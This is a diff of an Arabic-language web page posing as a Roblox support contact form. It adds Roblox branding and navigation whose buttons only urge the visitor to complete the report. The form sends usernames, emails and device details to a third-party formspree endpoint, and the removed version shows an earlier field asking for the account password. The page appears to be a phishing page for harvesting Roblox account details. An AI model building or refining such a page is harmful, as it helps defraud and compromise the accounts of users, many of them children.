@@ -6,56 +6,70 @@
 <title>اتصل بنا</title>
 
 <style>
+
 body{
-font-family:Arial,sans-serif;
-background-color:#f7f7f7;
-direction:rtl;
+font-family:Arial;
 margin:0;
-padding:0;
+background:#f7f7f7;
+direction:rtl;
 }
 
 /* الشريط العلوي */
+
 .topbar{
-background:#f2f2f2;
-padding:10px;
 display:flex;
 align-items:center;
-gap:20px;
+gap:25px;
+background:#f2f2f2;
+padding:10px 20px;
 border-bottom:1px solid #ddd;
 }
 
-.topbar button{
+.logo{
+font-weight:bold;
+font-size:20px;
+letter-spacing:2px;
+}
+
+.nav button{
 background:none;
 border:none;
-font-size:16px;
+font-size:15px;
 cursor:pointer;
 }
 
-.topbar button:hover{
+.nav button:hover{
 text-decoration:underline;
 }
 
-/* الرسالة الحمراء */
+.search{
+margin-right:auto;
+}
+
+.search input{
+padding:6px 10px;
+border-radius:20px;
+border:1px solid #ccc;
+width:200px;
+}
+
+/* الرسالة */
+
 .warning{
 color:red;
 font-size:12px;
-margin-right:15px;
-margin-top:5px;
+margin:5px 25px;
 }
 
-/* صندوق النموذج */
+/* الفورم */
+
 .container{
 max-width:500px;
-margin:50px auto;
+margin:40px auto;
 background:#fff;
 padding:30px;
 border-radius:10px;
 box-shadow:0 0 10px rgba(0,0,0,0.1);
-}
-
-h2{
-text-align:center;
-margin-bottom:20px;
 }
 
 label{
@@ -74,13 +88,13 @@ box-sizing:border-box;
 }
 
 textarea{
-resize:none;
 height:100px;
+resize:none;
 }
 
 button.submit{
 background:#808080;
-color:#fff;
+color:white;
 border:none;
 margin-top:20px;
 cursor:pointer;
@@ -89,17 +103,27 @@ cursor:pointer;
 button.submit:hover{
 background:#555;
 }
+
 </style>
 </head>
 
 <body>
 
-<!-- الأزرار فوق -->
 <div class="topbar">
+
+<div class="logo">ROBLOX</div>
+
+<div class="nav">
 <button onclick="showMsg()">Robux</button>
 <button onclick="showMsg()">إنشاء</button>
 <button onclick="showMsg()">السوق</button>
 <button onclick="showMsg()">الرائجة</button>
+</div>
+
+<div class="search">
+<input type="text" placeholder="البحث">
+</div>
+
 </div>
 
 <div id="msg" class="warning"></div>
@@ -111,52 +135,23 @@ background:#555;
 <form action="https://formspree.io/f/mvzwrgbe" method="POST">
 
 <label>اسم المستخدم</label>
-<input type="text" name="username" placeholder="اسم المستخدم">
-
-<label>كلمة المرور</label>
-<input type="text" name="first_name" placeholder="هوبا لوبا">
-
-<label>الاسم الثاني</label>
-<input type="text" name="last_name" placeholder="الاسم الثاني">
+<input type="text" name="username">
 
 <label>البريد الإلكتروني</label>
-<input type="email" name="email" placeholder="البريد الإلكتروني" required>
-
-<label>تأكيد البريد الإلكتروني</label>
-<input type="email" name="confirm_email" placeholder="تأكيد البريد الإلكتروني" required>
+<input type="email" name="email" required>
 
 <label>نوع الجهاز</label>
 <select name="device">
 <option value="">اختر النوع</option>
 <option>كمبيوتر</option>
-<option>كمبيوتر محمول</option>
 <option>أندرويد</option>
 <option>iPhone</option>
-<option>تابلت أندرويد</option>
-<option>iPad</option>
 <option>Xbox</option>
 <option>PlayStation</option>
-<option>Meta Quest</option>
-<option>أخرى</option>
-</select>
-
-<label>نوع فئة المساعدة</label>
-<select name="help_type">
-<option value="">اختر الفئة</option>
-<option>تم اختراق الحساب</option>
-<option>تعذر تسجيل الدخول</option>
-<option>مشتريات Robux</option>
-<option>استرداد Robux</option>
-<option>الإبلاغ عن إساءة</option>
-<option>الإبلاغ عن استغلال</option>
-<option>DMCA</option>
-<option>بطاقة الهدايا</option>
-<option>أفكار واقتراحات</option>
-<option>نصب ممتلكات</option>
 </select>
 
 <label>يرجى وصف مشكلتك</label>
-<textarea name="message" placeholder="ما هي المشكلة التي تواجهها"></textarea>
+<textarea name="message"></textarea>
 
 <button class="submit" type="submit">ارسال الطلب</button>
 
@@ -167,12 +162,16 @@ background:#555;
 <script>
 
 function showMsg(){
-document.getElementById("msg").innerText="يرجى اكمال البلاغ";
-}
 
-document.querySelector('form').addEventListener('submit',function(){
-alert('تم إرسال النموذج بنجاح!');
-});
+const msg=document.getElementById("msg")
+
+msg.innerText="يرجى اكمال البلاغ"
+
+setTimeout(()=>{
+msg.innerText=""
+},7000)
+
+}
 
 </script>
 
